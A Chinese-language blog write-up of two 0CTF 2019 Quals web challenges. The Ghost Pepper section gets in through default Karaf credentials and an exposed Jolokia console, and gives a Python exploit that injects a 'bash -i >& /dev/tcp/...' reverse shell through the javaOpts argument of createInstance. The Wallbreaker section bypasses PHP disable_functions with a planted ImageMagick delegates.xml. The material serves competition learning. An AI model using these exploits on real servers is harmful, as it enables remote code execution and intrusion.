---
title: "0ctf 2019 Quals Web writeup"
date: 2019-03-26T16:04:55+08:00
categories: ["CTF", "Security"]
tags: ["web", "ctf"]
---

本次比赛两个web题都是[RicterZ](https://ricterz.me/)大佬出的，膜一波Orz

## Ghost Pepper

本题首先通过观察401的响应包找到HTTP Basic认证的用户名karaf：

![401.png](/images/posts/0ctf-2019-Quals-Web-writeup/401.png)

然后用密码karaf即可绕过认证。接下来通过目录爆破找到目录`http://karaf:karaf@192.168.2.88:31337/jolokia/`。到这里我们可以发现这是一个裸的jolokia控制台。

jolokia是一个Java系统管理解决方案。其采用轻量级的Json格式传输数据，可以方便地管理系统中的Servlet。所以当应用暴露了jolokia目录的时候，基本上算是直接暴露出来一个webshell。我们可以通过访问`http://karaf:karaf@192.168.2.88:31337/jolokia/list`来查看可用的api，来寻找利用点。在本题中有三种解题方式：

### 解法 1

通过karaf下bundle模块远程安装一个我们自己写的恶意bundle，反弹一个shell到自己的服务器上。参考<https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi>。但是由于我不熟悉Java编译出来的东西始终装不上Orz，等弄好了把整个项目代码扔github上面去= =

### 解法 2

第二种方法应该算是最省事的方法了，即通过karaf下feature模块安装一个webconsole：

![webconsole](/images/posts/0ctf-2019-Quals-Web-writeup/webconsole.png)

之后我们访问`http://192.168.2.88:31337/system/console/bundles`就可以进入到webconsole的管理界面。在管理界面点Main -> Goto即可进入console。

![goto](/images/posts/0ctf-2019-Quals-Web-writeup/goto.png)

在console中执行`cat /flag`即可得到flag：

![console](/images/posts/0ctf-2019-Quals-Web-writeup/console.png)

### 解法 3

使用karaf中的Instance模块，在安装一个新的instance的时候进行instance的命令行参数注入。我们看karaf源码：<https://github.com/apache/karaf>。在`org/apache/karaf/instance/core/InstancesMBean.java`文件中定义了MBean的接口：

```java
// Operations
void startInstance(String name) throws MBeanException;
void startInstance(String name, String opts) throws MBeanException;
void startInstance(String name, String opts, boolean wait, boolean debug) throws MBeanException;
```

我们找startInstance方法的实现，在文件`org/apache/karaf/instance/command/StartCommand.java`中其调用了Instance的Start方法：

![startCommand](/images/posts/0ctf-2019-Quals-Web-writeup/startCommand.png)

跟进Instance类的start方法，其调用了InstanceService中的startInstance方法：

![instanceImpl](/images/posts/0ctf-2019-Quals-Web-writeup/instanceImpl.png)

继续跟进`org/apache/karaf/instance/core/internal/InstanceServiceImpl.java`，其调用了doStart方法：

![startInstance](/images/posts/0ctf-2019-Quals-Web-writeup/startInstance.png)

继续看doStart方法，其中有明显的命令拼接：

![doStart](/images/posts/0ctf-2019-Quals-Web-writeup/doStart.png)

在此处，我们发现javaOpt是我们可控的参数。在`InstancesMBeanImpl`中我们发现createInstance参数有一个就是javaOpt：

![mbean](/images/posts/0ctf-2019-Quals-Web-writeup/mbean.png)

于是我们给出攻击思路：

1. 创建一个新的Instance，在其javaOpt字段进行参数注入
2. 开启这个新的Instance执行我们的命令
3. 停止Instance
4. 删除Instance

最后我们给出exp：

```python
import requests
from pprint import pprint

url = "http://111.186.63.207:31337/jolokia/"

create_instance = {
    "type": "EXEC",
    "mbean":"org.apache.karaf:name=root,type=instance",
    "operation": "createInstance(java.lang.String,int,int,int,java.lang.String,java.lang.String,java.lang.String,java.lang.String)",
    "arguments": [
        "n0b0dy", # name
        22, # ssh port
        1099, # rmiRegistryPort
        44444, # rmiServerPort
        "/opt/opendaylight-0.9.2/instances/n0b0dy", # location
        "|| bash -i >& /dev/tcp/149.28.194.202/33333 0>&1 #", # javaOpts
        None, # features
        None # featureURLs
    ]
}

start_instance = {
    "type": "EXEC",
    "mbean":"org.apache.karaf:name=root,type=instance",
    "operation": "startInstance(java.lang.String,java.lang.String)",
    "arguments": [
        "n0b0dy", # name
        "", # opts
    ]
}


stop_instance = {
    "type": "EXEC",
    "mbean":"org.apache.karaf:name=root,type=instance",
    "operation": "stopInstance",
    "arguments": [
        "n0b0dy", # name
    ]
}


destory_instance = {
    "type": "EXEC",
    "mbean":"org.apache.karaf:name=root,type=instance",
    "operation": "destroyInstance",
    "arguments": [
        "n0b0dy", # name
    ]
}

headers = {
    "Authorization": "Basic a2FyYWY6a2FyYWY="
}

exp = [create_instance, start_instance, stop_instance, destory_instance]
for e in exp:
    rep = requests.post(url, json=e, headers=headers)
    pprint(rep.json())
```

## Wallbreaker

这个题目提出了一种新的用imagick来绕过`disable_function`的方法。根据[文档](https://imagemagick.org/script/resources.php)描述，`delegate.xml`用于指定转换特定文件用的命令：

> Associate delegate programs with certain image formats. ImageMagick relies on a number of delegate programs to support certain image formats such as ufraw-batch to read raw camera formats or Ghostscript to read Postscript images. Use this configuration file to map an input or output format to an external delegate program.

文档中还给出了一个[示例](https://imagemagick.org/source/delegates.xml)：

```xml
<delegatemap xmlns="">
<delegate xmlns="" decode="bpg" command=""bpgdec" -b 16 -o "%o.png" "%i"; /usr/bin/mv "%o.png" "%o""/>
...
</delegatemap>
```

我们可以看到`delegates.xml`中定义了很多命令执行的函数。那么我们可以自己定义`delegates.xml`文件吗？答案是可以的要不然这道题就没法做了2333

Imagick有一些环境变量比较重要，比如`HOME`变量。根据文档的描述，这个变量是用来寻找config文件的跟路径：

> Set path to search for configuration files in $HOME/.config/ImageMagick if the directory exists.

而Imagick的配置文件涉及到两个目录，即`$HOME/.config/ImageMagick`和`$HOME/.magick`。Imagick会在这两个目录下寻找delegates.xml文件，并进行解析。在delegates.xml中，我们可以对某个特定的文件后缀（此处为`foo`）指定其解析的方式。根据题目描述，我们将这个命令设置为需要执行的`/readflag`：

```xml
<delegatemap><delegate decode="foo" command="/readflag > /tmp//flag"/></delegatemap>
```

思路清晰以后，我们可以来写代码。首先在open_basedir的限制条件中找一个可以写的目录用来放我们的配置文件。题目的环境是tmp下面的一个根据ip生成的文件夹，在我们的环境中我们使用`/tmp`作为示例。同时我们打开error的显示便于调试：

```php
$home = '/tmp/';
ini_set('display_errors', 1);
```

接下来我们将HOME环境变量设置为`tmp`并向`$HOME`下面写入我们的`delegates.xml`文件：

```php
putenv("HOME=$home/");
mkdir("$home/.config/");
mkdir("$home/.config/ImageMagick");
file_put_contents("$home/.config/ImageMagick/delegates.xml",
    "<delegatemap><delegate decode=\"foo\" command=\"/readflag > $home/flag\"/></delegatemap>");
```

在delegate文件中，我们将`/readflag`的执行结果写入到`$HOME/flag`文件中，最后我们将结果读出来：

```php
touch("$home/test.foo");
try {
  $i = new Imagick("$home/test.foo");
  $i->writeImage("$home/test.png");
} catch(Exception $e) {
  var_dump($e);
}
var_dump(file_get_contents("$home/flag"));
```

经过这一波操作我们可以最终得到flag：

![result](/images/posts/0ctf-2019-Quals-Web-writeup/wallbreaker.png)